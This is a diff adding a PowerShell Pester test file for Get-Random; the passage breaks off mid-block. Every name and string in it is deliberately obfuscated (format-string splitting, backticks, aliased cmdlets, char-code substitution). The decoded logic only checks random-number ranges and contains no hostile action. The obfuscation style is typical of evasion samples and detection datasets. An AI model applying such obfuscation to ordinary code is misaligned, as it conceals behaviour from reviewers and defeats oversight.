@@ -1,0 +1,199 @@
+  ${5C`lu}= [TYpe]("{1}{0}" -f'32','INT') ;    &('sV') ("{1}{0}" -f'Od','a') ( [type]("{1}{0}"-F '4','Int6') );   &("{1}{2}{0}"-f'm','Se','t-ite') ('va'+'RiA'+'BLe:Fw'+'Id'+'9')  ([Type]("{1}{0}{2}"-f 'uB','Do','le')  );  &("{2}{0}{1}"-f't-IT','Em','sE') ("{1}{0}{2}{3}" -f 'blE:','vAria','kN','098') ([Type]("{1}{0}" -f't','In'))  ;
+
+&("{0}{1}"-f'Describ','e') ("{0}{4}{5}{1}{3}{6}{2}"-f 'Ge',' Uni','ts','t ','t-Rand','om DRT','Tes') -Tags "CI" {
+    ${t`ESTD`ATa} = @(
+        @{ ("{1}{0}"-f 'ame','N') = ("{2}{0}{1}" -f ' para','ms','no'); ("{0}{1}"-f'M','aximum') = ${NU`lL}; ("{0}{1}{2}"-f 'Mi','ni','mum') = ${N`UlL}; ("{2}{1}{0}"-f 'n','ha','GreaterT') = -1; ("{0}{1}"-f'Le','ssThan') = (  ( &("{2}{0}{1}" -f'RiaBL','E','va')  ('5c'+'Lu')  -VaLueOnlY )::"M`AXV`AlUE"); ("{1}{0}"-f'pe','Ty') = ("{2}{0}{1}{3}"-f'.','I','System','nt32') }
+        @{ ("{1}{0}"-f 'e','Nam') = ("{4}{2}{0}{6}{5}{7}{1}{3}" -f 'ly ','n','n','umber','o','ive','posit',' maximum '); ("{1}{0}" -f 'mum','Maxi') = 100; ("{2}{1}{0}"-f 'm','u','Minim') = ${N`Ull}; ("{0}{1}{2}" -f 'Gr','eaterT','han') = -1; ("{2}{0}{1}" -f 'ssTha','n','Le') = 100; ("{0}{1}" -f'Ty','pe') = ("{2}{0}{1}{3}"-f 'ystem.In','t3','S','2') }
+        @{ ("{0}{1}" -f 'Na','me') = ("{1}{0}{9}{3}{2}{6}{10}{8}{4}{7}{5}"-f 'axi','m','t to 0','um se','egative nu','er',', Min','mb','m to a n','m','imu'); ("{1}{0}" -f 'm','Maximu') = 0; ("{1}{0}{2}"-f'inimu','M','m') = -100; ("{1}{0}{2}{3}"-f 'reat','G','erTha','n') = -101; ("{0}{1}" -f'Les','sThan') = 0; ("{1}{0}" -f 'pe','Ty') = ("{1}{0}{2}"-f'ystem.I','S','nt32') }
+        @{ ("{0}{1}"-f'Na','me') = ("{8}{5}{6}{3}{2}{4}{7}{9}{0}{1}"-f' Mi','nimum',' m','e','axim','si','tiv','um','po',', negative'); ("{0}{1}" -f 'Maxi','mum') = 100; ("{1}{0}{2}" -f'm','Mini','um') = -100; ("{1}{2}{0}" -f 'Than','Great','er') = -101; ("{1}{0}{2}"-f'Th','Less','an') = 100; ("{0}{1}" -f 'T','ype') = ("{1}{0}{2}{3}"-f 'stem.In','Sy','t','32') }
+        @{ ("{0}{1}"-f 'N','ame') = ("{2}{0}{1}" -f 'egati','ve','both n'); ("{0}{1}"-f'Maxim','um') = -100; ("{1}{2}{0}" -f 'mum','Min','i') = -200; ("{1}{3}{0}{2}"-f 'te','Gr','rThan','ea') = -201; ("{1}{2}{0}"-f'an','Le','ssTh') = -100; ("{0}{1}" -f 'Typ','e') = ("{0}{2}{1}{3}"-f 'Syst','n','em.I','t32') }
+        @{ ("{0}{1}"-f'N','ame') = ("{4}{2}{5}{3}{1}{0}" -f's',' parenthese',' negat','ve with','both','i'); ("{0}{1}"-f'M','aximum') = (-100); ("{0}{1}"-f'Minim','um') = (-200); ("{0}{3}{1}{2}" -f'Gre','h','an','aterT') = -201; ("{1}{2}{0}" -f'n','Less','Tha') = -100; ("{0}{1}" -f'Typ','e') = ("{1}{2}{0}" -f'.Int32','Syste','m') }
+        @{ ("{0}{1}" -f'Nam','e') = ("{0}{3}{1}{2}{4}" -f 'm','nc','lose','aximum e','d in quote'); ("{1}{0}{2}" -f'm','Maxi','um') = '8'; ("{2}{1}{0}" -f'um','m','Mini') = 5; ("{3}{0}{2}{1}" -f 'r','n','eaterTha','G') = 4; ("{1}{0}{2}" -f'Th','Less','an') = 8; ("{1}{0}"-f'ype','T') = ("{0}{3}{1}{2}"-f 'Sy','In','t32','stem.') }
+        @{ ("{1}{0}" -f'me','Na') = ("{2}{4}{3}{0}{1}" -f'ed in quot','e','min','m enclos','imu'); ("{1}{0}{2}" -f 'ax','M','imum') = 8; ("{0}{1}" -f 'Minim','um') = '5'; ("{2}{0}{1}" -f'ater','Than','Gre') = 4; ("{1}{0}"-f'essThan','L') = 8; ("{1}{0}"-f 'pe','Ty') = ("{1}{0}{2}" -f'ystem','S','.Int32') }
+        @{ ("{1}{0}" -f 'me','Na') = ("{1}{4}{5}{3}{2}{0}" -f'h plus sign','m',' wit','m','axim','u'); ("{1}{2}{0}" -f'm','Maxi','mu') = +100; ("{1}{0}{2}" -f'nimu','Mi','m') = 0; ("{2}{1}{0}"-f 'an','erTh','Great') = -1; ("{1}{2}{0}" -f 'an','LessT','h') = 100; ("{1}{0}"-f 'e','Typ') = ("{1}{2}{0}{3}"-f 'stem','S','y','.Int32') }
+        @{ ("{1}{0}" -f'ame','N') = ("{5}{3}{4}{0}{1}{6}{7}{8}{2}"-f ' sign a','n','e','m wit','h plus','maximu','d ','quo','t'); ("{0}{1}" -f'Maxi','mum') = ("{0}{1}" -f'+10','0'); ("{1}{2}{0}" -f 'um','Mi','nim') = 0; ("{2}{1}{0}" -f'han','reaterT','G') = -1; ("{2}{0}{1}"-f'sT','han','Les') = 100; ("{0}{1}" -f 'Typ','e') = ("{0}{3}{1}{2}"-f 'System.','n','t32','I') }
+        @{ ("{0}{1}"-f 'Nam','e') = ("{2}{1}{3}{0}" -f'h quote','ot','b','h wit'); ("{1}{0}"-f'um','Maxim') = ("{0}{1}" -f '+10','0'); ("{1}{0}" -f 'imum','Min') = ("{1}{0}" -f'0','-10'); ("{2}{0}{3}{1}" -f 'rea','rThan','G','te') = -101; ("{1}{0}"-f'sThan','Les') = 100; ("{1}{0}" -f 'ype','T') = ("{0}{3}{2}{1}"-f 'S','32','Int','ystem.') }
+        @{ ("{0}{1}" -f'Nam','e') = ("{1}{0}{4}{3}{2}"-f 'et','maximum s','o kb','t',' '); ("{1}{0}"-f'ximum','Ma') = '1kb'; ("{1}{0}"-f'm','Minimu') = 0; ("{1}{2}{0}"-f'n','Gre','aterTha') = -1; ("{0}{1}{2}"-f'LessT','ha','n') = 1024; ("{0}{1}"-f 'Typ','e') = ("{3}{2}{1}{0}"-f 'Int32','tem.','ys','S') }
+        @{ ("{0}{1}"-f 'Na','me') = ("{4}{0}{1}{2}{3}"-f'ximum',' is Int64.','M','axValue','ma'); ("{0}{1}{2}" -f 'Maxim','u','m') = ( ${A`Od}::"mA`XVaL`Ue"); ("{0}{1}" -f'Minim','um') = ${n`Ull}; ("{1}{2}{3}{0}"-f'an','G','reater','Th') = ([int64]-1); ("{0}{2}{1}" -f 'Le','Than','ss') = ( ${a`OD}::"m`AxVaLuE"); ("{0}{1}"-f'Ty','pe') = ("{1}{0}{3}{2}" -f 'stem.Int','Sy','4','6') }
+        @{ ("{0}{1}"-f 'N','ame') = ("{0}{6}{1}{7}{4}{3}{5}{2}"-f'm','imum i','ger',' 64-bit int','a','e','ax','s '); ("{0}{2}{1}"-f'M','m','aximu') = ([int64]100); ("{0}{1}{2}"-f'M','i','nimum') = ${Nu`ll}; ("{3}{0}{2}{1}"-f 'e','han','rT','Great') = ([int64]-1); ("{1}{2}{0}"-f 'an','LessT','h') = ([int64]100); ("{1}{0}" -f'pe','Ty') = ("{2}{0}{1}{3}" -f'.I','nt6','System','4') }
+        @{ ("{0}{1}" -f 'Na','me') = ("{1}{12}{2}{0}{7}{14}{13}{4}{6}{11}{10}{8}{9}{5}{3}" -f 'u','ma','m','lue','er','.MaxVa',' gre','m s','nt','32','ter than i','a','xi','a large integ','et to '); ("{2}{1}{0}"-f 'm','imu','Max') = 100000000000; ("{1}{0}" -f 'um','Minim') = ${Nu`Ll}; ("{2}{0}{3}{1}"-f 'reat','han','G','erT') = ([int64]-1); ("{2}{1}{0}"-f 'han','sT','Les') = ([int64]100000000000); ("{1}{0}"-f 'e','Typ') = ("{2}{1}{0}" -f '4','stem.Int6','Sy') }
+        @{ ("{1}{0}"-f'ame','N') = ("{2}{3}{4}{10}{1}{0}{11}{12}{9}{5}{7}{8}{6}" -f' Mi','t to 0,','m','axi','mum','4-','er','bit int','eg',' a negative 6',' se','nimum set t','o'); ("{2}{0}{1}"-f'imu','m','Max') = ([int64]0); ("{0}{1}{2}" -f 'Min','im','um') = ([int64]-100); ("{2}{0}{1}"-f 'eat','erThan','Gr') = ([int64]-101); ("{1}{0}{2}" -f'essTh','L','an') = ([int64]0); ("{1}{0}" -f'e','Typ') = ("{3}{2}{0}{1}"-f'st','em.Int64','y','S') }
+        @{ ("{1}{0}"-f 'ame','N') = ("{16}{4}{1}{10}{11}{12}{5}{9}{14}{2}{13}{0}{3}{17}{15}{6}{8}{7}"-f' ne','o po','t t','gativ','t','-bit number, m','4-','umber','bit n','i','siti','ve 6','4','o','n se',' 6','maximum set ','e'); ("{2}{0}{1}" -f 'ax','imum','M') = ([int64]100); ("{0}{1}" -f 'M','inimum') = ([int64]-100); ("{2}{1}{0}"-f'erThan','at','Gre') = ([int64]-101); ("{2}{0}{1}" -f 'e','ssThan','L') = ([int64]100); ("{1}{0}" -f'ype','T') = ("{3}{1}{2}{0}"-f 't64','yst','em.In','S') }
+        @{ ("{0}{1}" -f'Nam','e') = ("{4}{5}{7}{2}{0}{1}{6}{3}"-f 'e nega','tive 64-','r','it number','bot','h','b',' a'); ("{1}{0}" -f'm','Maximu') = ([int64]-100); ("{2}{1}{0}"-f 'mum','ini','M') = ([int64]-200); ("{0}{2}{1}"-f 'Gre','an','aterTh') = ([int64]-201); ("{2}{0}{1}" -f 's','sThan','Le') = ([int64]-100); ("{1}{0}"-f 'e','Typ') = ("{1}{0}{2}" -f '.I','System','nt64') }
+        @{ ("{0}{1}" -f 'N','ame') = ("{0}{6}{2}{4}{5}{7}{1}{3}" -f 'bo','it','h are ','h parentheses','negative 64-bit',' numbe','t','r w'); ("{0}{1}" -f 'Max','imum') = ([int64](-100)); ("{2}{1}{0}" -f 'nimum','i','M') = ([int64](-200)); ("{0}{3}{2}{1}"-f 'Greate','n','a','rTh') = ([int64]-201); ("{1}{0}{2}" -f 'ss','Le','Than') = ([int64]-100); ("{0}{1}"-f'T','ype') = ("{1}{3}{0}{2}"-f'ste','S','m.Int64','y') }
+        @{ ("{0}{1}" -f'Nam','e') = ("{4}{7}{1}{0}{3}{5}{9}{8}{2}{6}" -f'64','s ','ege','-bit','max is',' ','r',' 32-bit, min i','t','in'); ("{2}{1}{0}" -f'imum','x','Ma') = '8'; ("{1}{0}{2}"-f'ini','M','mum') = ([int64]5); ("{2}{0}{1}" -f'reaterTh','an','G') = ([int64]4); ("{2}{1}{0}" -f 'an','essTh','L') = ([int64]8); ("{0}{1}"-f 'T','ype') = ("{0}{3}{1}{2}" -f 'S','stem.Int6','4','y') }
+        @{ ("{1}{0}" -f 'ame','N') = ("{6}{4}{0}{1}{3}{2}{8}{9}{5}{7}{10}" -f '4-b','it,',' is 3',' min','is 6','in','max ','te','2','-bit ','ger'); ("{0}{2}{1}" -f 'Maxi','m','mu') = ([int64]8); ("{1}{0}"-f 'imum','Min') = '5'; ("{2}{0}{3}{1}"-f 'r','an','G','eaterTh') = ([int64]4); ("{0}{1}{2}"-f'Le','s','sThan') = ([int64]8); ("{0}{1}" -f 'Typ','e') = ("{0}{1}{2}" -f'System.I','nt6','4') }
+        @{ ("{0}{1}"-f'Na','me') = ("{11}{1}{3}{5}{8}{2}{9}{6}{0}{10}{12}{4}{7}"-f't t','x','intege',' s','t','et to a 32-b','e','64]0','it ','r, min s','o [','ma','in'); ("{1}{2}{0}"-f 'm','Maxim','u') = +100; ("{0}{1}{2}"-f'M','i','nimum') = ([int64]0); ("{1}{2}{0}" -f'n','Great','erTha') = ([int64]-1); ("{1}{2}{0}" -f'an','Less','Th') = ([int64]100); ("{0}{1}"-f'T','ype') = ("{2}{0}{1}" -f 'm.Int6','4','Syste') }
+        @{ ("{0}{1}"-f'Na','me') = ("{0}{5}{4}{6}{1}{2}{3}"-f'max set to','eg','er ','with quote','2-bit',' a 3',' int'); ("{0}{2}{1}"-f 'Max','um','im') = ("{1}{0}" -f '100','+'); ("{2}{0}{1}"-f 'imu','m','Min') = ([int64]0); ("{3}{0}{1}{2}" -f 'e','ater','Than','Gr') = ([int64]-1); ("{1}{2}{0}" -f'n','L','essTha') = ([int64]100); ("{0}{1}" -f'T','ype') = ("{0}{2}{1}{3}" -f'Sys','.Int6','tem','4') }
+        @{ ("{0}{1}"-f'N','ame') = ("{5}{7}{6}{2}{0}{8}{12}{3}{10}{9}{4}{11}{1}" -f'in i','ger','m','3','i','max ','[int64]0, ','is ','s ',' ','2-bit','nte','a '); ("{2}{1}{0}" -f'um','im','Max') = ([int64]0); ("{2}{1}{0}"-f'm','u','Minim') = ("{0}{1}" -f '-10','0'); ("{0}{1}{2}{3}"-f'Gr','e','ate','rThan') = ([int64]-101); ("{0}{2}{1}" -f 'Le','sThan','s') = ([int64]0); ("{0}{1}" -f 'Typ','e') = ("{1}{3}{2}{0}" -f '64','S','m.Int','yste') }
+        @{ ("{1}{0}" -f 'e','Nam') = ("{16}{8}{3}{2}{7}{15}{14}{6}{0}{1}{11}{5}{10}{12}{13}{9}{4}" -f 'o a',' 6','1','o ','n','t integer g','set t','MB','t','mi','reater th','4-bi','a','n ',' max ',',','min set '); ("{0}{1}" -f'Max','imum') = ([int64]1048585); ("{0}{1}{2}"-f 'Min','im','um') = '1mb'; ("{0}{3}{1}{2}"-f 'Gr','terTha','n','ea') = ([int64]1048575); ("{2}{0}{1}" -f 'e','ssThan','L') = ([int64]1048585); ("{0}{1}"-f 'T','ype') = ("{2}{1}{0}"-f 'nt64','m.I','Syste') }
+        @{ ("{1}{0}" -f 'e','Nam') = ("{7}{4}{3}{5}{0}{2}{6}{1}" -f 'in',' mb',' set ','x set to','a',' 1tb, m','to 10','m'); ("{2}{0}{1}"-f 'ax','imum','M') = '1tb'; ("{1}{0}"-f 'inimum','M') = ("{0}{1}"-f '1','0mb'); ("{1}{0}{2}"-f 'eaterTh','Gr','an') = ([int64]10485759); ("{2}{1}{0}" -f 'Than','ss','Le') = ([int64]1099511627776); ("{0}{1}" -f'T','ype') = ("{2}{3}{0}{1}"-f'm.Int6','4','Sys','te') }
+        @{ ("{1}{0}" -f 'ame','N') = ("{7}{8}{2}{9}{5}{11}{0}{3}{6}{10}{1}{4}"-f 'n is ','in','nt64.Ma','In','Value','ue, ','t6','max ','is i','xVal','4.M','mi'); ("{1}{0}"-f'ximum','Ma') = (  ( &('Gi') ('vaRi'+'ABle:a'+'od') )."Va`lUe"::"ma`Xval`UE"); ("{0}{1}" -f 'Mini','mum') = ( ${A`od}::"M`iN`VALuE"); ("{1}{0}{3}{2}"-f 'eate','Gr','Than','r') = (  ${A`Od}::"MiNv`Al`UE"); ("{2}{1}{0}"-f'n','ssTha','Le') = ( (  &('gI')  ("{2}{0}{1}"-f'abl','E:aod','vaRI')  )."va`LUe"::"MaxVa`l`UE"); ("{0}{1}" -f'Ty','pe') = ("{1}{0}{3}{2}"-f'stem.I','Sy','64','nt') }
+        @{ ("{1}{0}" -f'me','Na') = ("{1}{5}{9}{6}{7}{2}{4}{10}{0}{3}{8}" -f' a','both are','pl',' 32-bit','u',' int6','xV','alue ',' integer','4.Ma','s'); ("{1}{0}" -f'um','Maxim') = ([int64](( (  &("{0}{1}{2}"-f'ch','ILDIT','Em') ('VaRi'+'ab'+'l'+'E:Kn'+'098'))."Va`lUE"::"mAx`VAlue")+15)); ("{1}{2}{0}"-f 'nimum','M','i') = ([int64](( ${K`N098}::"Ma`X`ValUe")+10)); ("{2}{1}{0}{3}"-f'eat','r','G','erThan') = ([int64]((  ${kn0`98}::"maX`VaLUe")+9)); ("{2}{1}{0}" -f 'an','sTh','Les') = ([int64]((  ${k`N098}::"Ma`xvaL`Ue")+15)); ("{0}{1}" -f'T','ype') = ("{3}{0}{2}{1}" -f'I','64','nt','System.') }
+        @{ ("{0}{1}" -f 'Na','me') = ("{13}{10}{8}{6}{12}{5}{1}{11}{9}{14}{3}{2}{7}{4}{0}"-f ' quote','out ','pe, and ','d ty','th','ue with','than in','max wi','r ','ecif','oth are greate','sp','t32.MaxVal','b','ie'); ("{1}{0}"-f'imum','Max') = ("{0}{1}{2}"-f'10009900','000','1'); ("{2}{1}{0}" -f 'um','im','Min') = 100000000001; ("{0}{3}{2}{1}"-f'Gre','Than','er','at') = ([int64]10000000000); ("{0}{1}" -f 'LessTh','an') = ([int64]100099000001); ("{0}{1}"-f'Typ','e') = ("{0}{1}{2}{3}"-f'S','yste','m.In','t64') }
+        @{ ("{0}{1}"-f'N','ame') = ("{13}{12}{6}{7}{14}{8}{4}{11}{2}{3}{1}{10}{5}{0}{9}"-f 'u','d ','if','ie','lue without','nd min with q','r than ','int','.MaxVa','ote','type, a',' spec','te','both are grea','32'); ("{1}{0}"-f'ximum','Ma') = 100000002230; ("{1}{0}{2}"-f 'mu','Mini','m') = ("{2}{3}{1}{0}" -f '02222','00','1','0000'); ("{0}{1}{2}"-f'G','reaterTha','n') = ([int64]100000002221); ("{0}{1}{2}" -f 'LessT','h','an') = ([int64]100000002230); ("{0}{1}"-f 'T','ype') = ("{1}{2}{0}{3}" -f'em.In','S','yst','t64') }
+        @{ ("{0}{1}" -f 'Nam','e') = ("{10}{13}{5}{9}{7}{15}{4}{6}{8}{3}{2}{1}{14}{0}{11}{12}"-f 'd','s',' ','t','in',' greate','t32.MaxV','han','alue withou','r t','max i',' typ','e','s','pecifie',' '); ("{2}{1}{0}"-f'mum','i','Max') = 90000000000; ("{0}{1}" -f'M','inimum') = 4; ("{1}{0}{2}{3}"-f 't','Grea','erTh','an') = ([int64]3); ("{2}{1}{0}"-f 'n','essTha','L') = ([int64]90000000000); ("{1}{0}"-f 'e','Typ') = ("{1}{2}{0}" -f '64','System.','Int') }
+        @{ ("{1}{0}"-f 'me','Na') = ("{1}{5}{4}{6}{7}{2}{3}{0}"-f 'er','ma',' n','umb',' is ','x','a double-precis','ion'); ("{1}{0}"-f'mum','Maxi') = 100.0; ("{0}{1}"-f'Minimu','m') = ${N`UlL}; ("{0}{2}{1}"-f'Greate','n','rTha') = -1.0; ("{1}{0}"-f'sThan','Les') = 100.0; ("{0}{1}" -f 'T','ype') = ("{0}{1}{3}{2}"-f 'System.','Doub','e','l') }
+        @{ ("{1}{0}" -f'ame','N') = ("{3}{2}{4}{6}{1}{5}{0}{8}{7}" -f' neg','um',' are ','both','double-precis','bers, min is','ion n','tive.','a'); ("{0}{1}"-f 'Ma','ximum') = 0.0; ("{0}{2}{1}" -f 'Mi','m','nimu') = -100.0; ("{1}{3}{2}{0}"-f 'han','G','rT','reate') = -101.0; ("{1}{2}{0}"-f 'ssThan','L','e') = 0.0; ("{0}{1}" -f 'Ty','pe') = ("{2}{3}{0}{1}" -f 'b','le','System.Do','u') }
+        @{ ("{0}{1}" -f 'Na','me') = ("{3}{1}{12}{13}{4}{2}{5}{15}{14}{8}{10}{9}{7}{17}{11}{0}{16}{6}" -f 'e','th ar','ision n','bo','e-prec','um','tive.',' ','is p','e,','ositiv','n','e d','oubl','r, max ','be','ga','min is '); ("{0}{1}" -f 'Maxi','mum') = 100.0; ("{0}{1}"-f 'Minim','um') = -100.0; ("{1}{2}{0}" -f 'terThan','G','rea') = -101.0; ("{1}{2}{0}" -f'n','LessT','ha') = 100.0; ("{1}{0}"-f 'pe','Ty') = ("{3}{2}{1}{0}" -f'e','.Doubl','stem','Sy') }
+        @{ ("{1}{0}" -f 'ame','N') = ("{4}{2}{5}{6}{7}{3}{9}{10}{8}{1}{0}" -f'32','ber, min is int','ax is a','reci','m',' d','ouble-','p','m','s','ion nu'); ("{0}{1}" -f 'M','aximum') = 8.0; ("{0}{1}" -f'Min','imum') = 5; ("{0}{3}{1}{2}" -f 'Gr','aterTha','n','e') = 4.0; ("{1}{0}{2}" -f 'essT','L','han') = 8.0; ("{0}{1}" -f'Ty','pe') = ("{1}{3}{2}{4}{0}"-f'uble','S','s','y','tem.Do') }
+        @{ ("{1}{0}" -f'e','Nam') = ("{4}{2}{3}{1}{0}{7}{6}{5}" -f'io','ecis','le-p','r','min is a doub',' int32','umber, max is','n n'); ("{1}{2}{0}"-f 'mum','Max','i') = 8; ("{0}{1}{2}" -f 'Mini','m','um') = 5.0; ("{2}{0}{1}{3}" -f 'ter','T','Grea','han') = 4.0; ("{2}{0}{1}"-f 'sT','han','Les') = 8.0; ("{0}{1}" -f 'Typ','e') = ("{3}{0}{1}{2}" -f'tem','.','Double','Sys') }
+        @{ ("{1}{0}"-f 'e','Nam') = ("{1}{3}{2}{6}{0}{5}{4}"-f ' ','ma','a','x set to a speci','ouble number','d','l'); ("{1}{2}{0}"-f'mum','Ma','xi') = 20.; ("{0}{1}" -f 'M','inimum') = 0.0; ("{3}{1}{2}{0}" -f'erThan','ea','t','Gr') = -1.0; ("{2}{0}{1}" -f'h','an','LessT') = 20.0; ("{0}{1}"-f'Ty','pe') = ("{0}{2}{1}" -f'System.','uble','Do') }
+        @{ ("{1}{0}"-f'e','Nam') = ("{3}{5}{4}{6}{7}{2}{0}{1}" -f' quot','e','th','ma',' is','x',' dou','ble wi'); ("{1}{0}{2}"-f'xi','Ma','mum') = '20.'; ("{1}{0}{2}"-f'mu','Mini','m') = 0.0; ("{1}{2}{0}{3}" -f 'Th','Grea','ter','an') = -1.0; ("{2}{0}{1}" -f 'ess','Than','L') = 20.0; ("{1}{0}"-f 'e','Typ') = ("{3}{1}{0}{2}" -f'm.Do','yste','uble','S') }
+        @{ ("{0}{1}" -f'N','ame') = ("{1}{2}{3}{4}{0}"-f 'with plus sign','ma','x ','is dou','ble '); ("{1}{0}" -f 'imum','Max') = +100.0; ("{2}{0}{1}"-f 'inimu','m','M') = 0; ("{2}{1}{0}" -f'erThan','reat','G') = -1.0; ("{0}{1}{2}" -f'Les','s','Than') = 100.0; ("{1}{0}"-f'pe','Ty') = ("{3}{0}{2}{1}"-f'ys','em.Double','t','S') }
+        @{ ("{1}{0}" -f 'me','Na') = ("{3}{5}{2}{12}{10}{8}{9}{4}{6}{11}{0}{7}{1}" -f' ','closed in quote','d','max i','us ','s ','s','en','th',' pl','i','ign and','ouble w'); ("{1}{0}{2}" -f'mu','Maxi','m') = ("{1}{0}" -f'0','+100.'); ("{0}{2}{1}" -f 'Mi','m','nimu') = 0; ("{2}{0}{1}" -f 'a','terThan','Gre') = -1.0; ("{0}{2}{1}" -f'L','an','essTh') = 100.0; ("{1}{0}" -f'pe','Ty') = ("{0}{2}{1}"-f'Syste','ble','m.Dou') }
+        @{ ("{0}{1}"-f'Na','me') = ("{6}{3}{0}{12}{4}{5}{8}{10}{9}{2}{11}{7}{1}"-f 'set ','x ','s as 1.0','oth ','e sp','ec','b','x','ia','ber','l num','e+','to th'); ("{1}{0}"-f 'um','Maxim') = ${Nu`lL}; ("{0}{1}"-f'Mini','mum') = 1.0e+100; ("{2}{0}{1}" -f 'aterTh','an','Gre') = 1.0e+99; ("{0}{1}{2}"-f 'LessTh','a','n') = ( (  &('gI')  ("{1}{0}{2}{3}"-f 'arI','V','ABLe:','FwiD9') )."VAL`UE"::"MA`xvAl`UE"); ("{1}{0}"-f 'e','Typ') = ("{1}{2}{0}" -f 'e','System.Dou','bl') }
+        @{ ("{1}{0}"-f'ame','N') = ("{3}{7}{1}{5}{2}{0}{12}{11}{4}{10}{8}{9}{6}" -f'uble.MaxV','x','s Do','m',', m',' i','ue','a','le.MinV','al','in is Doub','lue','a'); ("{1}{0}"-f 'mum','Maxi') = ( ( &("{3}{2}{1}{0}"-f 'E','aRIABl','-V','gET') ("{1}{0}"-f'iD9','Fw')  -vaLueoNl )::"mAX`V`AluE"); ("{0}{1}" -f 'M','inimum') = ( (  &("{1}{0}" -f'IR','d')  ("vaRi"+"a"+"Bl"+"e:FwId9") )."VAL`UE"::"MiN`V`Alue"); ("{2}{1}{0}"-f'terThan','a','Gre') = (  (&("{0}{1}"-f'I','TeM')  ("{0}{2}{1}{3}"-f'vaRI',':fwi','aBlE','d9') )."V`ALUe"::"mIN`V`ALuE"); ("{2}{1}{0}"-f 'ssThan','e','L') = ( ${fWi`D9}::"m`A`xVaLUE"); ("{0}{1}"-f 'T','ype') = ("{0}{3}{2}{1}" -f 'Sy','ouble','.D','stem') }
+    )
+
+    ${tESt`dat`AfOr`er`Ror} = @(
+        @{ ("{1}{0}"-f'e','Nam') = ("{1}{16}{9}{7}{15}{4}{12}{13}{6}{10}{11}{8}{0}{2}{3}{14}{5}" -f 'o','Min','sitiv','e 32','x an','teger',' a','reater than ',' p','s g','r','e','d al','l','-bit in','ma',' i'); ("{0}{2}{1}" -f 'M','um','axim') = 10; ("{0}{2}{1}" -f 'M','mum','ini') = 20}
+        @{ ("{1}{0}"-f 'e','Nam') = ("{8}{10}{0}{2}{7}{4}{6}{5}{3}{1}{9}"-f 'nd ',' positive 32-bi','M','e','x are same and all','ar',' ','a','M','t integer','in a'); ("{0}{1}{2}"-f 'Maxi','mu','m') = 20; ("{0}{1}{2}"-f'M','inim','um') = 20}
+        @{ ("{0}{1}"-f'N','ame') = ("{8}{1}{7}{4}{11}{2}{9}{3}{6}{10}{0}{5}" -f'2-bit i','r','nd all are','ne','an ma','nteger','gat',' th','Min is greate',' ','ive 3','x a'); ("{1}{2}{0}" -f'm','Ma','ximu') = -20; ("{1}{0}{2}"-f'imu','Min','m') = -10}
+        @{ ("{0}{1}"-f 'Nam','e') = ("{8}{11}{3}{13}{5}{9}{6}{10}{1}{4}{15}{16}{7}{2}{12}{14}{0}"-f ' 32-bit integer','a','ega','e ','ll ','am',' and','n','Min and','e',' ',' Max ar','ti','s','ve','are',' '); ("{1}{0}{2}"-f 'i','Max','mum') = -20; ("{2}{1}{0}" -f'nimum','i','M') = -20}
+        @{ ("{1}{0}" -f 'ame','N') = ("{5}{0}{4}{9}{7}{6}{3}{12}{8}{11}{14}{2}{13}{1}{10}" -f 'reater','umb','re','e',' than ','Min is g','all ar',' and ','pos','max','er','itive ',' ','cision n','double-p'); ("{0}{2}{1}" -f 'M','ximum','a') = 10.0; ("{0}{1}{2}" -f'Mini','mu','m') = 20.0}
+        @{ ("{0}{1}" -f'Nam','e') = ("{2}{3}{0}{12}{13}{5}{7}{14}{6}{10}{4}{1}{9}{11}{8}" -f 'd Max a','-p','Min a','n','e','l are','doub',' posit','er','recision num','l','b','re',' same and al','ive '); ("{1}{0}" -f 'um','Maxim') = 20.0; ("{0}{1}{2}" -f'Mi','nim','um') = 20.0}
+        @{ ("{0}{1}" -f 'N','ame') = ("{17}{1}{2}{12}{3}{19}{20}{18}{11}{14}{4}{7}{9}{8}{15}{10}{5}{0}{13}{16}{6}"-f'p',' ','is','ate','a','e-',' number','re ','a','neg','ubl','a',' gre','r','x and all ','tive do','ecision','Min','an m','r',' th'); ("{2}{1}{0}"-f 'm','ximu','Ma') = -20.0; ("{0}{1}"-f 'Min','imum') = -10.0}
+        @{ ("{1}{0}" -f 'e','Nam') = ("{15}{1}{13}{8}{11}{7}{5}{10}{6}{14}{4}{2}{9}{12}{3}{0}" -f 'ion number','in','ble-p','is','dou','ll ','re negati','me and a','a','r','a','nd Max are sa','ec',' ','ve ','M'); ("{0}{2}{1}"-f 'Ma','imum','x') = -20.0; ("{2}{0}{1}" -f 'i','nimum','M') = -20.0}
+        @{ ("{0}{1}"-f 'Nam','e') = ("{1}{8}{3}{5}{0}{2}{10}{6}{7}{9}{4}"-f' ','Max i','i','gative n',' ','umber, min',' d','efault numb','s a ne','er','s the'); ("{0}{1}"-f 'Maxi','mum') = -10; ("{0}{1}"-f 'M','inimum') = ${nu`lL}}
+    )
+
+    
+    &('It') ((("{10}{4}{6}{1}{8}{3}{5}{9}{0}{2}{7}" -f 'fo','corr','r FUZ<Name>','c','return','t ra',' a ','FUZ','e','ndom number ','Should '))."R`E`PLaCe"(([cHAR]70+[cHAR]85+[cHAR]90),[StrinG][cHAR]39)) -TestCases ${teST`DATA} {
+        param(${maXi`m`Um}, ${Mi`NI`muM}, ${gr`Ea`Te`RTHan}, ${Less`T`Han}, ${Ty`pE})
+
+        ${rE`sULT} = &("{1}{3}{2}{0}" -f 'm','Ge','ndo','t-Ra') -Maximum ${M`A`XimuM} -Minimum ${Min`IMUM}
+        ${rE`s`ULt} | &("{1}{0}"-f 'ould','Sh') -BeGreaterThan ${GR`EAt`e`RthAn}
+        ${r`E`sUlt} | &("{1}{0}"-f 'ould','Sh') -BeLessThan ${Les`s`THAn}
+        ${r`esuLT} | &("{0}{1}{2}" -f'S','ho','uld') -BeOfType ${t`Ype}
+    }
+
+    &('It') ((("{8}{2}{11}{9}{3}{6}{12}{10}{7}{5}{0}{1}{4}"-f'sp','eci','a','rs for hWJ<N','fied',' ','am','h Count','Should return correct r','m numbe',' wit','ndo','e>hWJ'))."r`epLAce"('hWJ',[strinG][chaR]39)) -TestCases ${tesT`d`AtA} {
+        param(${Max`iM`Um}, ${MInim`UM}, ${GRea`TeR`THAn}, ${L`EsSt`HaN}, ${T`yPe})
+
+        ${r`ES`ULt} = &("{2}{0}{1}"-f'et-Rando','m','G') -Maximum ${Ma`xiM`UM} -Minimum ${minI`mUM} -Count 1
+        ${rE`SuLT} | &("{0}{1}" -f'Sho','uld') -BeGreaterThan ${g`REaTErtH`AN}
+        ${r`e`sULt} | &("{1}{0}" -f'hould','S') -BeLessThan ${L`E`SS`THan}
